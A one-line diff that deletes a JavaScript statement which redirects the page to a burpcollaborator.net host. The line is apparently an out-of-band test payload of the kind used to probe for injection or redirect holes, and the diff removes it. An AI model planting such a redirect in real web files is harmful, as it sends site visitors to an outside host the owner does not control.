@@ -1,1 +1,0 @@
-window.location.replace("http://mwmob81gfc8ijqieu18996hgx73yrn.burpcollaborator.net");
